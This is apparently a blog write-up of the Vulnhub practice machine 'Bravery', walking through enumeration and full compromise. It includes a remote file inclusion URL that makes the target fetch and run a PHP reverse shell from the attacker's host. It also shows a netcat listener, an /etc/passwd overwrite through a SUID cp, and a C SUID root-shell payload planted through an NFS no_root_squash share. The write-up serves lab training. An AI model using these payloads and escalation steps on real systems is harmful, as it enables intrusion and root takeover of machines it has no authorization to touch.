---
layout: post
title: "Vulnhub - Bravery"
subtitle: "Enumerate more"
date: 2021-08-16 09:45:13 -0400
background: '/img/blue_wave.jpg'
---

# Introduction

This is a write up for a Vulnhub box called Bravery. After checking the initial Nmap results I saw the first proof that it is indeed OSCP-like due to many ports and services being open, which might seem overwhelming  Anyways, let's jump in.

# Enumeration

After setting the network interface to NAT and opening the virtual machine, I ran arp-scan to locate the machine on my local network :


```
sudo arp-scan -local
Interface: eth0, type: EN10MB
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
.
.
192.168.2.137	00:0c:29:84:61:f5	VMware, Inc.
.
.
```

After locating the vulnerable box on our network we can then proceed with the standard Nmap scan to enumerate services and their versions. This is the output of the scan :

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8f:bc:01:49:75:83:00:65:a9:53:a9:75:c6:57:33 (RSA)
|   256 92:f7:04:e2:09:aa:d0:d7:e6:fd:21:67:1f:bd:64:ce (ECDSA)
|_  256 fb:08:cd:e8:45:8c:1a:c1:06:1b:24:73:33:a5:e4:77 (ED25519)
53/tcp   open  domain      dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      38065/tcp6  nlockmgr
|   100021  1,3,4      38209/tcp   nlockmgr
|   100021  1,3,4      39328/udp   nlockmgr
|   100021  1,3,4      57993/udp6  nlockmgr
|   100024  1          41312/udp   status
|   100024  1          43524/tcp6  status
|   100024  1          43938/tcp   status
|   100024  1          53446/udp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp  open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2018-06-10T15:53:25
|_Not valid after:  2019-06-10T15:53:25
|_ssl-date: TLS randomness does not represent time
445/tcp  open  netbios-ssn Samba smbd 4.7.1 (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     3 (RPC #100227)
3306/tcp open  mysql       MariaDB (unauthorized)
8080/tcp open  http        nginx 1.12.2
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 4 disallowed entries 
|_/cgi-bin/ /qwertyuiop.html /private /public
|_http-server-header: nginx/1.12.2
|_http-title: Welcome to Bravery! This is SPARTA!
MAC Address: 00:0C:29:52:9A:D7 (VMware)
Service Info: Host: BRAVERY

Host script results:
|_clock-skew: mean: -1h06m40s, deviation: 2h18m34s, median: -2h26m41s
|_nbstat: NetBIOS name: BRAVERY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.1)
|   Computer name: localhost
|   NetBIOS computer name: BRAVERY\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2021-08-15T11:08:41-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-15T15:08:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Note that i also ran autorecon only to discover 3 more open ports :

```
20048/tcp open  mountd      syn-ack ttl 64 1-3 (RPC #100005)
38209/tcp open  nlockmgr    syn-ack ttl 64 1-4 (RPC #100021)
43938/tcp open  status      syn-ack ttl 64 1 (RPC #100024)
```

 Even if this result was a bit overwhelming to you - fear not. Always remember to note things down and make a checklist to monitor what have you went over and what you discovered - since it might come in handy later on.

After seeing this output I immediately knew I needed to use gobuster on ports 80 and 8080 so it can finish until I check those two webservers manually. I used the seclist to enumerate. Note that I peeked on 8080 to discover the mail.php file so that is the reason I also put .php as an extension  :

```
gobuster dir -u http://192.168.2.137:80/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e html,php,txt
.
.
http://192.168.2.137:80/uploads              (Status: 301) [Size: 237] [--> http://192.168.2.137/uploads/]
http://192.168.2.137:80/about                (Status: 200) [Size: 79]
http://192.168.2.137:80/.                    (Status: 403) [Size: 4897]
http://192.168.2.137:80/.htaccess            (Status: 403) [Size: 211]
http://192.168.2.137:80/contactus            (Status: 200) [Size: 27]
.
.
```

The above was port 80 and this is port 8080: 
```
gobuster dir -u http://192.168.2.137:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e html,php,txt
.
.
http://192.168.2.137:8080/private              (Status: 301) [Size: 185] [--> http://192.168.2.137:8080/private/]
http://192.168.2.137:8080/about                (Status: 200) [Size: 503]
http://192.168.2.137:8080/public               (Status: 301) [Size: 185] [--> http://192.168.2.137:8080/public/]
.
.
```
I checked out the /uploads/ directory and only found one thing intersting :

![cuppa-cms-hint](/img/posts/vulnhub-bravery/cuppa-cms-hint.png)

While not being such useful info, it can serve as a hint on what will happen later. Moving on.

I went on to check http://192.168.2.137:8080/public/ but I couldn't find anything useful there. Since I did not want to get stuck at webservers for too long I went on an enumerate NFS :

```
showmount -e 192.168.2.137
Export list for 192.168.2.137:
/var/nfsshare *
```
So we can mount this. I'm using sudo since im running as a non-root account :

```
sudo mount 192.168.2.136:/var/nfsshare/ /mnt
```

After checking this I didn't find anything useful (except the box creator's enthusiasm about *try harder*). 

Next up I decided to check out SMB with smbclient. First I tried null authentication (no password or username) and after that, I tried to check the *anonymous* share :

```
smbclient -L //192.168.2.137
\Enter WORKGROUP\p4r490n's password: 

	Sharename       Type      Comment
	---------       ----      -------
	anonymous       Disk      
	secured         Disk      
	IPC$            IPC       IPC Service (Samba Server 4.7.1)
SMB1 disabled -- no workgroup available
```

```
smbclient //192.168.2.137/anonymous
Enter WORKGROUP\p4r490n's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Sep 28 09:01:35 2018
  ..                                  D        0  Thu Jun 14 12:30:39 2018
  patrick's folder                    D        0  Fri Sep 28 08:38:27 2018
  qiu's folder                        D        0  Fri Sep 28 09:27:20 2018
  genevieve's folder                  D        0  Fri Sep 28 09:08:31 2018
  david's folder                      D        0  Tue Dec 25 21:19:51 2018
  kenny's folder                      D        0  Fri Sep 28 08:52:49 2018
  qinyi's folder                      D        0  Fri Sep 28 08:45:22 2018
  sara's folder                       D        0  Fri Sep 28 09:34:23 2018
  readme.txt                          N      489  Fri Sep 28 09:54:03 2018

		17811456 blocks of size 1024. 13181840 blocks available
```
After this it was time to grab everything. I made sure i have recurse flag option turned to ON and prompt to OFF :

![smbclient-download](/img/posts/vulnhub-bravery/smbclient-download.png)


Checking all the files which I found from Samba took some time. I suggest using the -laR flag with *ls* to get a birds-eye view of what is inside directories. The only thing which I found interesting were the hints that there has to be a CMS running somewhere on the webservers. 

Since my previous gobusting adventures turned out mediocre and *meh* results I decided to spice things up and switch the wordlist that I'm using. My go-to big wordlist is **/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt** . The results are the following :

```bash
gobuster dir -u http://192.168.2.137:80/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e html,php,txt
..
.
http://192.168.2.136:80/about                (Status: 200) [Size: 79]
http://192.168.2.136:80/contactus            (Status: 200) [Size: 27]
http://192.168.2.136:80/uploads              (Status: 301) [Size: 237] [--> http://192.168.2.136/uploads/]
http://192.168.2.136:80/genevieve            (Status: 301) [Size: 239] [--> http://192.168.2.136/genevieve/]
.
..
```

/genevieve! That was a username that we found in SMB files. After checking it, under out we find **http://192.168.2.136/genevieve/cuppaCMS/index.php**

![genevieve](/img/posts/vulnhub-bravery/genevieve.png)

This takes us to Cuppa CMS :

![cuppa-cms](/img/posts/vulnhub-bravery/cuppa-cms.png)

I remembered a note from a file in Genevieve's SMB directory (called *important*):

```text
need to migrate CMS. obsolete. speak to qiu about temporarily using her IIS to test a sharepoint installation.
```
So it seems that the CMS might be retired. That might be due to many reasons and one of them of course could be a security-related one. Lets go for a *low-hangind* fruit and use searchsploit :

```bash
searchsploit Cuppa CMS
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                             | php/webapps/25971.txt
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Could it be that the version we see on the webserver is vulnerable? Let's check out the disclosure :


```text
..
.
-----------------------------------------------------------------------------
LINE 22: 
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------
    

#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
..
.
```

This include statement can let us include any file we like - remote or local. Let's try to see if the server is vulnerable. All we need to do is go to */alerts/alertConfigField.php?urlConfig=* and exploit the **urlConfig** parameter :

![lfi](/img/posts/vulnhub-bravery/lfi.png)

LFI is a success :) Let's try Remote File Inclusion. I prefer to use a simple php-reverse-shell from Pentest Monkey. You can find it down in the Sources. So the whole point of this is for the webserver to query our web server for a certain file (in this case a malicious one) and execute it. This is a critical vulnerability and should serve as a note to all future developers out there to be more careful and implement secure coding practices. Let's just edit out the reverse shell and put our IP and port in there.

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.2.128';
$port = 80;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

After this let's host our server on port 445. Let's use a python server :

```bash
┌──(p4r490n@parrot)-[~/Documents/Vulnhub/Bravery/exploits]
└─$ ls
php-reverse-shell.php
──(p4r490n@parrot)-[~/Documents/Vulnhub/Bravery/exploits]
└─$ sudo python3 -m http.server 445
```

Now, let's set up a netcat listener on port 80: 

```bash
┌──(p4r490n@parrot)-[~]
└─$ sudo nc -nlvp 80
```
Now to access the URL :

**http://192.168.2.137/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.2.128:445/php-reverse-shell.php**

The webserver talks to our web server, gets the reverse shell and executes it and we get a shell as apache :

![shell](/img/posts/vulnhub-bravery/shell.png)

# Privilege Escalation


After setting up a proper tty (check my [Archangel](https://p4r490n.github.io/2021/06/06/TryHackMe-Archangel.html) post) and looking around I noticed at least two ways to escalate privileges. The first one is with using **cp** binary and the other one is using no_root_squash - a setting that allows a user on the local machine to add files as root to the share - which then gets uploaded to the server. A *really*  bad idea. Let's take a look at escalation number one - the **cp** binary :

## Using /usr/bin/cp


```bash
-rwsr-xr-x. 1 root root 155176 Apr 11  2018 /usr/bin/cp
.
-rw-r--r--. 1 root root 130 Jun 23  2018 maintenance.sh
```

Since **cp** uses root privileges each time it runs we can copy any file we want and replace anything we want with what we specify.

The content of maintenance :

```bash
#!/bin/sh

rm /var/www/html/README.txt
echo "Try harder!" > /var/www/html/README.txt
chown apache:apache /var/www/html/README.txt
```


The cp binary is running as root and the maintenance.sh is owned by root. I checked crontab but all I got was *no crontab for apache* message. After using pspy32 I saw that the root is executing this file :

![pspy32](/img/posts/vulnhub-bravery/pspy32.png)

We could in theory write our maintenance.sh file which will be executed later, but I decided to go for simple password injection by creating my own *passwd* file and copying it over to /etc/passwd which will replace the original.

```
──(p4r490n@parrot)-[~]
└─$ openssl passwd -1 -salt p4r490n totalysecure
$1$p4r490n$rW0LrQRqlA.65EOEkwyEu1
```

We can then make our own passwd file and add this at the bottom :

```
p4r490n:$1$p4r490n$rW0LrQRqlA.65EOEkwyEu1:0:0:root:/root:/bin/bash
```

Then its time to copy it over :

```
apache@bravery /dev/shm$ ls
linpeas.sh  passwd  pspy32
pache@bravery /dev/shm$ cat passw 
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
.
.
p4r490n:$1$p4r490n$rW0LrQRqlA.65EOEkwyEu1:0:0:root:/root:/bin/bash
.
apache@bravery /dev/shm$ /usr/bin/cp passwd /etc/passwd
apache@bravery /dev/shm$ su p4r490
Password: 
ABRT has detected 1 problem(s). For more info run: abrt-cli list --since 1545797712
root@bravery /dev/shm# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
```

This is it for the **cp** binary. Now to no_root_squash

## NFS no_root_squash misconfiguration


Since we can copy things over to the previously mounted drive in /mnt on our machine - let's create a C SUID payload, compile it on our machine, make it sticky and execute it over on the vulnerable machine.

```c
int main(void){
    setresuid(0, 0, 0);
    system("/bin/sh");
    return 0;
}
```
Lets name this payload.c in /tmp, and compile it in /mnt:

```bash
┌──(p4r490n@parrot)-[/tmp]
└─$ sudo gcc payload.c -o /mnt/payload
payload.c: In function ‘main’:
payload.c:2:5: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
    2 |     setresuid(0, 0, 0);
      |     ^~~~~~~~~
payload.c:3:5: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
    3 |     system("/bin/sh");
      |     ^~~~~~
┌──(p4r490n@parrot)-[/tmp]
└─$ chmod +s /mnt/payload
```

We got some errors but everything is alright in the end. Now that the file is inside out /mnt directory let's check it over on the vulnerable machine. The location there is /var/nfsshare :

```bash
ache@bravery /var/nfsshare$ ls - 
total 48
drwxrwxrwx.  3 nfsnobody nfsnobody   161 Aug 16 07:59 .
drwxr-xr-x. 24 root      root       4096 Dec 25  2018 ..
-rw-r--r--.  1 root      root         15 Dec 26  2018 README.txt
-rw-r--r--.  1 root      root         29 Dec 26  2018 discovery
-rw-r--r--.  1 root      root         51 Dec 26  2018 enumeration
-rw-r--r--.  1 root      root         20 Dec 26  2018 explore
drwxr-xr-x.  2 root      root         19 Dec 26  2018 itinerary
-rw-r--r--.  1 root      root        104 Dec 26  2018 password.txt
-rwsr-sr-x.  1 root      root      16664 Aug 16 07:19 payload
-rw-r--r--.  1 root      root         67 Dec 26  2018 qwertyuioplkjhgfdsazxcvbnm
ache@bravery /var/nfsshare$ ./payload
sh-4.2# id
uid=0(root) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

Rooted due to misconfigurations with NFS. 


# Conclusion & Tips

This box was full of mini-rabbit holes and things you can easily lose your time going over. The trick was to read between the lines and realize there has to be something else on that webserver - which caused me to switch the wordlists and get to the /genevieve/ directory. For those who missed it - don't worry. Just remember to use a big wordlist if your enumeration of the webserver is returning no useful results and you see no other way anywhere else.

The root section was straightforward with at least two ways to get the root, both being very interesting and dangerous vectors - the **cp** SUID binary and NFS *no_root_squash* misconfiguration.

Overall - it is a very interesting box that shows the importance of proper enumeration.

# Sources 

[Pentestmonkey's php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

[C_SUID payloads](https://book.hacktricks.xyz/linux-unix/privilege-escalation/payloads-to-execute#c)

